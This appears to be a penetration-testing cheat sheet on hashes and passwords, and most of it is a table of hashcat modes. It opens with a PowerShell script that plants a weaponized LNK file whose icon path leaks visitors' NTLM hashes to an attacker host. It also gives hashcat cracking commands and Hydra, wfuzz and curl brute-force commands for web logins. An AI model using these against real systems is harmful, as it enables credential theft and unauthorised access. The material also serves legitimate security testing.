# Hashes and Passwords 

[Obtaining Hashes](#obtaining_hashes)  
[Default Passwords](#default_passwords)  
[Password Cracking](#password_cracking)  
[Wordlists](#wordlists)  
[Rules](#rules)  
[Hashcat](#hashcat)  
[Cracking Website Logins](#cracking_websites)

## <a name="obtaining_hashes">Obtaining Hashes</a>  

### NTLM HASHES

**LNK File Method  
This method drops a weaponized LNK file into the root of a share with read level access.  As users browse the share, their hashes are sent to our host server.

Modify the Powershell script below and execute.  

```$ip = 'x.x.x.x'
$filename = 'test.ico'

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("evil.txt.lnk")
$lnk.TargetPath = "$HOME\evil.txt"
$lnk.WindowStyle = 1
$lnk.IconLocation = "\\$ip\$filename"
Write-Output $lnk.Save()

Write-Output "Saved successfully at $HOME\evil.txt"  
```   


## <a name="default_passwords">Default Passwords</a>

[SecLists/Default Passwords](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)  

####<a name="password_cracking">Password Cracking</a>

### <a name="wordlists">Wordlists</a>  
[SecLists/Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)  

### <a name="rules"> Rules  (Rule will add permutations to wordlists)</a>   
[Hob0Rules](https://github.com/praetorian-inc/Hob0Rules)  

<a name="getting_hashes">### Getting Hashes</a>  
From ZIP files  
`zip2john <ZIP ARCHIVE> > <OUTFILE>`

From RAR files  
`rar2john <RAR ARCHIVE> > <OUTFILE>`

### <a name="hash_types"> Linux Shadow File Hash Types </a>  
| | |
|---|---|
|$1$|MD5|
|$2a$|Blowfish|
|$2y$|Blowfish|
|$5$|SHA256|
|$6$|SHA512|  

### <a name="hashcat">Hashcat</a>  

Cracking MD5 passwords with simple word list - output to cracked.txt  
`hashcat -a 0 -m 0 <HASHES> wordlists/rockyou.txt -o cracked.txt`  

Cracking NTLM passwords with simple word list - output to cracked.txt  
`hashcat -a 0 -m 1000 <HASHES> wordlists/rockyou.txt -o cracked.txt`  

### <a name="cracking_websites">Cracking Website Logins</a>  
**Hydra  
`hydra -l <USERNAME> -P <WORDLIST> <HOST> http-form-post "<POSTING PAGE>:<USERNAMEID>=^USER^&<PASSWORDID>=^PASS^:<FAILEDLOGINSTRINGFROMPAGE>" -vVf`  
`wfuzz -c -z file,<USERFILE> -z file,<PASSWORDFILE> -d "{username=FUZZ,password=FUZ2Z}" <TARGET>`

**Bash  
`for user in $(cat users.txt); do curl URL --data POSTDATA -H "Content-Type:CONTENTTYPE" 2>/dev/null | grep -v FAILEDVERBIAGE && echo $user; done`  



List of Hashcat Modes
[local copy - v6.1.1](#hashcat_modes) | [hashcat homepage](https://hashcat.net/wiki/doku.php?id=hashcat)  

### <a name="hashcat_modes">Hashcat Modes</a> 

 |#|Name|Category|
|---|---|---|
|900|MD4|RawHash|
|0|MD5|RawHash|
|100|SHA1|RawHash|
|1300|SHA2-224|RawHash|
|1400|SHA2-256|RawHash|
|10800|SHA2-384|RawHash|
|1700|SHA2-512|RawHash|
|17300|SHA3-224|RawHash|
|17400|SHA3-256|RawHash|
|17500|SHA3-384|RawHash|
|17600|SHA3-512|RawHash|
|6000|RIPEMD-160|RawHash|
|600|BLAKE2b-512|RawHash|
|11700|GOSTR34.11-2012(Streebog)256-bit,big-endian|RawHash|
|11800|GOSTR34.11-2012(Streebog)512-bit,big-endian|RawHash|
|6900|GOSTR34.11-94|RawHash|
|5100|HalfMD5|RawHash|
|18700|JavaObjecthashCode()|RawHash|
|17700|Keccak-224|RawHash|
|17800|Keccak-256|RawHash|
|17900|Keccak-384|RawHash|
|18000|Keccak-512|RawHash|
|21400|sha256(sha256_bin($pass))|RawHash|
|6100|Whirlpool|RawHash|
|10100|SipHash|RawHash|
|21000|BitSharesv0.x-sha512(sha512_bin(pass))|RawHash|
|10|md5($pass.$salt)|RawHash,Saltedand/orIterated|
|20|md5($salt.$pass)|RawHash,Saltedand/orIterated|
|3800|md5($salt.$pass.$salt)|RawHash,Saltedand/orIterated|
|3710|md5($salt.md5($pass))|RawHash,Saltedand/orIterated|
|4110|md5($salt.md5($pass.$salt))|RawHash,Saltedand/orIterated|
|4010|md5($salt.md5($salt.$pass))|RawHash,Saltedand/orIterated|
|21300|md5($salt.sha1($salt.$pass))|RawHash,Saltedand/orIterated|
|40|md5($salt.utf16le($pass))|RawHash,Saltedand/orIterated|
|2600|md5(md5($pass))|RawHash,Saltedand/orIterated|
|3910|md5(md5($pass).md5($salt))|RawHash,Saltedand/orIterated|
|4400|md5(sha1($pass))|RawHash,Saltedand/orIterated|
|20900|md5(sha1($pass).md5($pass).sha1($pass))|RawHash,Saltedand/orIterated|
|21200|md5(sha1($salt).md5($pass))|RawHash,Saltedand/orIterated|
|4300|md5(strtoupper(md5($pass)))|RawHash,Saltedand/orIterated|
|30|md5(utf16le($pass).$salt)|RawHash,Saltedand/orIterated|
|110|sha1($pass.$salt)|RawHash,Saltedand/orIterated|
|120|sha1($salt.$pass)|RawHash,Saltedand/orIterated|
|4900|sha1($salt.$pass.$salt)|RawHash,Saltedand/orIterated|
|4520|sha1($salt.sha1($pass))|RawHash,Saltedand/orIterated|
|140|sha1($salt.utf16le($pass))|RawHash,Saltedand/orIterated|
|19300|sha1($salt1.$pass.$salt2)|RawHash,Saltedand/orIterated|
|14400|sha1(CX)|RawHash,Saltedand/orIterated|
|4700|sha1(md5($pass))|RawHash,Saltedand/orIterated|
|4710|sha1(md5($pass).$salt)|RawHash,Saltedand/orIterated|
|21100|sha1(md5($pass.$salt))|RawHash,Saltedand/orIterated|
|18500|sha1(md5(md5($pass)))|RawHash,Saltedand/orIterated|
|4500|sha1(sha1($pass))|RawHash,Saltedand/orIterated|
|130|sha1(utf16le($pass).$salt)|RawHash,Saltedand/orIterated|
|1410|sha256($pass.$salt)|RawHash,Saltedand/orIterated|
|1420|sha256($salt.$pass)|RawHash,Saltedand/orIterated|
|22300|sha256($salt.$pass.$salt)|RawHash,Saltedand/orIterated|
|1440|sha256($salt.utf16le($pass))|RawHash,Saltedand/orIterated|
|20800|sha256(md5($pass))|RawHash,Saltedand/orIterated|
|20710|sha256(sha256($pass).$salt)|RawHash,Saltedand/orIterated|
|1430|sha256(utf16le($pass).$salt)|RawHash,Saltedand/orIterated|
|1710|sha512($pass.$salt)|RawHash,Saltedand/orIterated|
|1720|sha512($salt.$pass)|RawHash,Saltedand/orIterated|
|1740|sha512($salt.utf16le($pass))|RawHash,Saltedand/orIterated|
|1730|sha512(utf16le($pass).$salt)|RawHash,Saltedand/orIterated|
|19500|RubyonRailsRestful-Authentication|RawHash,Saltedand/orIterated|
|50|HMAC-MD5(key=$pass)|RawHash,Authenticated|
|60|HMAC-MD5(key=$salt)|RawHash,Authenticated|
|150|HMAC-SHA1(key=$pass)|RawHash,Authenticated|
|160|HMAC-SHA1(key=$salt)|RawHash,Authenticated|
|1450|HMAC-SHA256(key=$pass)|RawHash,Authenticated|
|1460|HMAC-SHA256(key=$salt)|RawHash,Authenticated|
|1750|HMAC-SHA512(key=$pass)|RawHash,Authenticated|
|1760|HMAC-SHA512(key=$salt)|RawHash,Authenticated|
|11750|HMAC-Streebog-256(key=$pass),big-endian|RawHash,Authenticated|
|11760|HMAC-Streebog-256(key=$salt),big-endian|RawHash,Authenticated|
|11850|HMAC-Streebog-512(key=$pass),big-endian|RawHash,Authenticated|
|11860|HMAC-Streebog-512(key=$salt),big-endian|RawHash,Authenticated|
|11500|CRC32|RawChecksum|
|14100|3DES(PT=$salt,key=$pass)|RawCipher,Known-Plaintextattack|
|14000|DES(PT=$salt,key=$pass)|RawCipher,Known-Plaintextattack|
|15400|ChaCha20|RawCipher,Known-Plaintextattack|
|14900|Skip32(PT=$salt,key=$pass)|RawCipher,Known-Plaintextattack|
|11900|PBKDF2-HMAC-MD5|GenericKDF|
|12000|PBKDF2-HMAC-SHA1|GenericKDF|
|10900|PBKDF2-HMAC-SHA256|GenericKDF|
|12100|PBKDF2-HMAC-SHA512|GenericKDF|
|8900|scrypt|GenericKDF|
|400|phpass|GenericKDF|
|16900|AnsibleVault|GenericKDF|
|12001|Atlassian(PBKDF2-HMAC-SHA1)|GenericKDF|
|20200|Pythonpasslibpbkdf2-sha512|GenericKDF|
|20300|Pythonpasslibpbkdf2-sha256|GenericKDF|
|20400|Pythonpasslibpbkdf2-sha1|GenericKDF|
|16100|TACACS+|NetworkProtocols|
|11400|SIPdigestauthentication(MD5)|NetworkProtocols|
|5300|IKE-PSKMD5|NetworkProtocols|
|5400|IKE-PSKSHA1|NetworkProtocols|
|2500|WPA-EAPOL-PBKDF2|NetworkProtocols|
|2501|WPA-EAPOL-PMK|NetworkProtocols|
|22000|WPA-PBKDF2-PMKID+EAPOL|NetworkProtocols|
|22001|WPA-PMK-PMKID+EAPOL|NetworkProtocols|
|16800|WPA-PMKID-PBKDF2|NetworkProtocols|
|16801|WPA-PMKID-PMK|NetworkProtocols|
|7300|IPMI2RAKPHMAC-SHA1|NetworkProtocols|
|10200|CRAM-MD5|NetworkProtocols|
|4800|iSCSICHAPauthentication,MD5(CHAP)|NetworkProtocols|
|16500|JWT(JSONWebToken)|NetworkProtocols|
|22600|TelegramDesktopAppPasscode(PBKDF2-HMAC-SHA1)|NetworkProtocols|
|22301|TelegramMobileAppPasscode(SHA256)|NetworkProtocols|
|7500|Kerberos5,etype23,AS-REQPre-Auth|NetworkProtocols|
|13100|Kerberos5,etype23,TGS-REP|NetworkProtocols|
|18200|Kerberos5,etype23,AS-REP|NetworkProtocols|
|19600|Kerberos5,etype17,TGS-REP|NetworkProtocols|
|19700|Kerberos5,etype18,TGS-REP|NetworkProtocols|
|19800|Kerberos5,etype17,Pre-Auth|NetworkProtocols|
|19900|Kerberos5,etype18,Pre-Auth|NetworkProtocols|
|5500|NetNTLMv1/NetNTLMv1+ESS|NetworkProtocols|
|5600|NetNTLMv2|NetworkProtocols|
|23|Skype|NetworkProtocols|
|11100|PostgreSQLCRAM(MD5)|NetworkProtocols|
|11200|MySQLCRAM(SHA1)|NetworkProtocols|
|8500|RACF|OperatingSystem|
|6300|AIX{smd5}|OperatingSystem|
|6700|AIX{ssha1}|OperatingSystem|
|6400|AIX{ssha256}|OperatingSystem|
|6500|AIX{ssha512}|OperatingSystem|
|3000|LM|OperatingSystem|
|19000|QNX/etc/shadow(MD5)|OperatingSystem|
|19100|QNX/etc/shadow(SHA256)|OperatingSystem|
|19200|QNX/etc/shadow(SHA512)|OperatingSystem|
|15300|DPAPImasterkeyfilev1|OperatingSystem|
|15900|DPAPImasterkeyfilev2|OperatingSystem|
|7200|GRUB2|OperatingSystem|
|12800|MS-AzureSyncPBKDF2-HMAC-SHA256|OperatingSystem|
|12400|BSDiCrypt,ExtendedDES|OperatingSystem|
|1000|NTLM|OperatingSystem|
|122|macOSv10.4,macOSv10.5,MacOSv10.6|OperatingSystem|
|1722|macOSv10.7|OperatingSystem|
|7100|macOSv10.8+(PBKDF2-SHA512)|OperatingSystem|
|9900|Radmin2|OperatingSystem|
|5800|SamsungAndroidPassword/PIN|OperatingSystem|
|3200|bcrypt$2*$,Blowfish(Unix)|OperatingSystem|
|500|md5crypt,MD5(Unix),Cisco-IOS$1$(MD5)|OperatingSystem|
|1500|descrypt,DES(Unix),TraditionalDES|OperatingSystem|
|7400|sha256crypt$5$,SHA256(Unix)|OperatingSystem|
|1800|sha512crypt$6$,SHA512(Unix)|OperatingSystem|
|13800|WindowsPhone8+PIN/password|OperatingSystem|
|2410|Cisco-ASAMD5|OperatingSystem|
|9200|Cisco-IOS$8$(PBKDF2-SHA256)|OperatingSystem|
|9300|Cisco-IOS$9$(scrypt)|OperatingSystem|
|5700|Cisco-IOStype4(SHA256)|OperatingSystem|
|2400|Cisco-PIXMD5|OperatingSystem|
|8100|CitrixNetScaler(SHA1)|OperatingSystem|
|22200|CitrixNetScaler(SHA512)|OperatingSystem|
|1100|DomainCachedCredentials(DCC),MSCache|OperatingSystem|
|2100|DomainCachedCredentials2(DCC2),MSCache2|OperatingSystem|
|7000|FortiGate(FortiOS)|OperatingSystem|
|125|ArubaOS|OperatingSystem|
|501|JuniperIVE|OperatingSystem|
|22|JuniperNetScreen/SSG(ScreenOS)|OperatingSystem|
|15100|Juniper/NetBSDsha1crypt|OperatingSystem|
|131|MSSQL(2000)|DatabaseServer|
|132|MSSQL(2005)|DatabaseServer|
|1731|MSSQL(2012,2014)|DatabaseServer|
|12|PostgreSQL|DatabaseServer|
|3100|OracleH:Type(Oracle7+)|DatabaseServer|
|112|OracleS:Type(Oracle11+)|DatabaseServer|
|12300|OracleT:Type(Oracle12+)|DatabaseServer|
|7401|MySQL$A$(sha256crypt)|DatabaseServer|
|200|MySQL323|DatabaseServer|
|300|MySQL4.1/MySQL5|DatabaseServer|
|8000|SybaseASE|DatabaseServer|
|1421|hMailServer|FTP,HTTP,SMTP,LDAPServer|
|8300|DNSSEC(NSEC3)|FTP,HTTP,SMTP,LDAPServer|
|16400|CRAM-MD5Dovecot|FTP,HTTP,SMTP,LDAPServer|
|1411|SSHA-256(Base64),LDAP{SSHA256}|FTP,HTTP,SMTP,LDAPServer|
|1711|SSHA-512(Base64),LDAP{SSHA512}|FTP,HTTP,SMTP,LDAPServer|
|10901|RedHat389-DSLDAP(PBKDF2-HMAC-SHA256)|FTP,HTTP,SMTP,LDAPServer|
|15000|FileZillaServer>=0.9.55|FTP,HTTP,SMTP,LDAPServer|
|12600|ColdFusion10+|FTP,HTTP,SMTP,LDAPServer|
|1600|Apache$apr1$MD5,md5apr1,MD5(APR)|FTP,HTTP,SMTP,LDAPServer|
|141|Episerver6.x<.NET4|FTP,HTTP,SMTP,LDAPServer|
|1441|Episerver6.x>=.NET4|FTP,HTTP,SMTP,LDAPServer|
|101|nsldap,SHA-1(Base64),NetscapeLDAPSHA|FTP,HTTP,SMTP,LDAPServer|
|111|nsldaps,SSHA-1(Base64),NetscapeLDAPSSHA|FTP,HTTP,SMTP,LDAPServer|
|7700|SAPCODVNB(BCODE)|EnterpriseApplicationSoftware(EAS)|
|7701|SAPCODVNB(BCODE)fromRFC_READ_TABLE|EnterpriseApplicationSoftware(EAS)|
|7800|SAPCODVNF/G(PASSCODE)|EnterpriseApplicationSoftware(EAS)|
|7801|SAPCODVNF/G(PASSCODE)fromRFC_READ_TABLE|EnterpriseApplicationSoftware(EAS)|
|10300|SAPCODVNH(PWDSALTEDHASH)iSSHA-1|EnterpriseApplicationSoftware(EAS)|
|133|PeopleSoft|EnterpriseApplicationSoftware(EAS)|
|13500|PeopleSoftPS_TOKEN|EnterpriseApplicationSoftware(EAS)|
|21500|SolarWindsOrion|EnterpriseApplicationSoftware(EAS)|
|8600|LotusNotes/Domino5|EnterpriseApplicationSoftware(EAS)|
|8700|LotusNotes/Domino6|EnterpriseApplicationSoftware(EAS)|
|9100|LotusNotes/Domino8|EnterpriseApplicationSoftware(EAS)|
|20600|OracleTransportationManagement(SHA256)|EnterpriseApplicationSoftware(EAS)|
|4711|Huaweisha1(md5($pass).$salt)|EnterpriseApplicationSoftware(EAS)|
|20711|AuthMesha256|EnterpriseApplicationSoftware(EAS)|
|12200|eCryptfs|Full-DiskEncryption(FDE)|
|22400|AESCrypt(SHA256)|Full-DiskEncryption(FDE)|
|14600|LUKS|Full-DiskEncryption(FDE)|
|13711|VeraCryptRIPEMD160+XTS512bit|Full-DiskEncryption(FDE)|
|13712|VeraCryptRIPEMD160+XTS1024bit|Full-DiskEncryption(FDE)|
|13713|VeraCryptRIPEMD160+XTS1536bit|Full-DiskEncryption(FDE)|
|13741|VeraCryptRIPEMD160+XTS512bit+boot-mode|Full-DiskEncryption(FDE)|
|13742|VeraCryptRIPEMD160+XTS1024bit+boot-mode|Full-DiskEncryption(FDE)|
|13743|VeraCryptRIPEMD160+XTS1536bit+boot-mode|Full-DiskEncryption(FDE)|
|13751|VeraCryptSHA256+XTS512bit|Full-DiskEncryption(FDE)|
|13752|VeraCryptSHA256+XTS1024bit|Full-DiskEncryption(FDE)|
|13753|VeraCryptSHA256+XTS1536bit|Full-DiskEncryption(FDE)|
|13761|VeraCryptSHA256+XTS512bit+boot-mode|Full-DiskEncryption(FDE)|
|13762|VeraCryptSHA256+XTS1024bit+boot-mode|Full-DiskEncryption(FDE)|
|13763|VeraCryptSHA256+XTS1536bit+boot-mode|Full-DiskEncryption(FDE)|
|13721|VeraCryptSHA512+XTS512bit|Full-DiskEncryption(FDE)|
|13722|VeraCryptSHA512+XTS1024bit|Full-DiskEncryption(FDE)|
|13723|VeraCryptSHA512+XTS1536bit|Full-DiskEncryption(FDE)|
|13771|VeraCryptStreebog-512+XTS512bit|Full-DiskEncryption(FDE)|
|13772|VeraCryptStreebog-512+XTS1024bit|Full-DiskEncryption(FDE)|
|13773|VeraCryptStreebog-512+XTS1536bit|Full-DiskEncryption(FDE)|
|13731|VeraCryptWhirlpool+XTS512bit|Full-DiskEncryption(FDE)|
|13732|VeraCryptWhirlpool+XTS1024bit|Full-DiskEncryption(FDE)|
|13733|VeraCryptWhirlpool+XTS1536bit|Full-DiskEncryption(FDE)|
|16700|FileVault2|Full-DiskEncryption(FDE)|
|20011|DiskCryptorSHA512+XTS512bit|Full-DiskEncryption(FDE)|
|20012|DiskCryptorSHA512+XTS1024bit|Full-DiskEncryption(FDE)|
|20013|DiskCryptorSHA512+XTS1536bit|Full-DiskEncryption(FDE)|
|22100|BitLocker|Full-DiskEncryption(FDE)|
|12900|AndroidFDE(SamsungDEK)|Full-DiskEncryption(FDE)|
|8800|AndroidFDE<=4.3|Full-DiskEncryption(FDE)|
|18300|AppleFileSystem(APFS)|Full-DiskEncryption(FDE)|
|6211|TrueCryptRIPEMD160+XTS512bit|Full-DiskEncryption(FDE)|
|6212|TrueCryptRIPEMD160+XTS1024bit|Full-DiskEncryption(FDE)|
|6213|TrueCryptRIPEMD160+XTS1536bit|Full-DiskEncryption(FDE)|
|6241|TrueCryptRIPEMD160+XTS512bit+boot-mode|Full-DiskEncryption(FDE)|
|6242|TrueCryptRIPEMD160+XTS1024bit+boot-mode|Full-DiskEncryption(FDE)|
|6243|TrueCryptRIPEMD160+XTS1536bit+boot-mode|Full-DiskEncryption(FDE)|
|6221|TrueCryptSHA512+XTS512bit|Full-DiskEncryption(FDE)|
|6222|TrueCryptSHA512+XTS1024bit|Full-DiskEncryption(FDE)|
|6223|TrueCryptSHA512+XTS1536bit|Full-DiskEncryption(FDE)|
|6231|TrueCryptWhirlpool+XTS512bit|Full-DiskEncryption(FDE)|
|6232|TrueCryptWhirlpool+XTS1024bit|Full-DiskEncryption(FDE)|
|6233|TrueCryptWhirlpool+XTS1536bit|Full-DiskEncryption(FDE)|
|10400|PDF1.1-1.3(Acrobat2-4)|Documents|
|10410|PDF1.1-1.3(Acrobat2-4),collider#1|Documents|
|10420|PDF1.1-1.3(Acrobat2-4),collider#2|Documents|
|10500|PDF1.4-1.6(Acrobat5-8)|Documents|
|10600|PDF1.7Level3(Acrobat9)|Documents|
|10700|PDF1.7Level8(Acrobat10-11)|Documents|
|9400|MSOffice2007|Documents|
|9500|MSOffice2010|Documents|
|9600|MSOffice2013|Documents|
|9700|MSOffice<=2003$0/$1,MD5+RC4|Documents|
|9710|MSOffice<=2003$0/$1,MD5+RC4,collider#1|Documents|
|9720|MSOffice<=2003$0/$1,MD5+RC4,collider#2|Documents|
|9800|MSOffice<=2003$3/$4,SHA1+RC4|Documents|
|9810|MSOffice<=2003$3,SHA1+RC4,collider#1|Documents|
|9820|MSOffice<=2003$3,SHA1+RC4,collider#2|Documents|
|18400|OpenDocumentFormat(ODF)1.2(SHA-256,AES)|Documents|
|18600|OpenDocumentFormat(ODF)1.1(SHA-1,Blowfish)|Documents|
|16200|AppleSecureNotes|Documents|
|15500|JKSJavaKeyStorePrivateKeys(SHA1)|PasswordManagers|
|6600|1Password,agilekeychain|PasswordManagers|
|8200|1Password,cloudkeychain|PasswordManagers|
|9000|PasswordSafev2|PasswordManagers|
|5200|PasswordSafev3|PasswordManagers|
|6800|LastPass+LastPasssniffed|PasswordManagers|
|13400|KeePass1(AES/Twofish)andKeePass2(AES)|PasswordManagers|
|11300|Bitcoin/Litecoinwallet.dat|PasswordManagers|
|16600|ElectrumWallet(Salt-Type1-3)|PasswordManagers|
|21700|ElectrumWallet(Salt-Type4)|PasswordManagers|
|21800|ElectrumWallet(Salt-Type5)|PasswordManagers|
|12700|Blockchain,MyWallet|PasswordManagers|
|15200|Blockchain,MyWallet,V2|PasswordManagers|
|18800|Blockchain,MyWallet,SecondPassword(SHA256)|PasswordManagers|
|16300|EthereumPre-SaleWallet,PBKDF2-HMAC-SHA256|PasswordManagers|
|15600|EthereumWallet,PBKDF2-HMAC-SHA256|PasswordManagers|
|15700|EthereumWallet,SCRYPT|PasswordManagers|
|22500|MultiBitClassic.key(MD5)|PasswordManagers|
|22700|MultiBitHD(scrypt)|PasswordManagers|
|11600|7-Zip|Archives|
|12500|RAR3-hp|Archives|
|13000|RAR5|Archives|
|17200|PKZIP(Compressed)|Archives|
|17220|PKZIP(CompressedMulti-File)|Archives|
|17225|PKZIP(MixedMulti-File)|Archives|
|17230|PKZIP(MixedMulti-FileChecksum-Only)|Archives|
|17210|PKZIP(Uncompressed)|Archives|
|20500|PKZIPMasterKey|Archives|
|20510|PKZIPMasterKey(6byteoptimization)|Archives|
|14700|iTunesbackup<10.0|Archives|
|14800|iTunesbackup>=10.0|Archives|
|23001|SecureZIPAES-128|Archives|
|23002|SecureZIPAES-192|Archives|
|23003|SecureZIPAES-256|Archives|
|13600|WinZip|Archives|
|18900|AndroidBackup|Archives|
|13200|AxCrypt|Archives|
|13300|AxCryptin-memorySHA1|Archives|
|8400|WBB3(WoltlabBurningBoard)|Forums,CMS,E-Commerce|
|2611|vBulletin<v3.8.5|Forums,CMS,E-Commerce|
|2711|vBulletin>=v3.8.5|Forums,CMS,E-Commerce|
|2612|PHPS|Forums,CMS,E-Commerce|
|121|SMF(SimpleMachinesForum)>v1.1|Forums,CMS,E-Commerce|
|3711|MediaWikiBtype|Forums,CMS,E-Commerce|
|4521|Redmine|Forums,CMS,E-Commerce|
|11|Joomla<2.5.18|Forums,CMS,E-Commerce|
|13900|OpenCart|Forums,CMS,E-Commerce|
|11000|PrestaShop|Forums,CMS,E-Commerce|
|16000|Tripcode|Forums,CMS,E-Commerce|
|7900|Drupal7|Forums,CMS,E-Commerce|
|21|osCommerce,xt:Commerce|Forums,CMS,E-Commerce|
|4522|PunBB|Forums,CMS,E-Commerce|
|2811|MyBB1.2+,IPB2+(InvisionPowerBoard)|Forums,CMS,E-Commerce|
|18100|TOTP(HMAC-SHA1)|One-TimePasswords|
|2000|STDOUT|Plaintext|
|99999|Plaintext|Plaintext|
|21600|Web2pypbkdf2-sha512|Framework|
|10000|Django(PBKDF2-SHA256)|Framework|
|124|Django(SHA-1)|Framework|
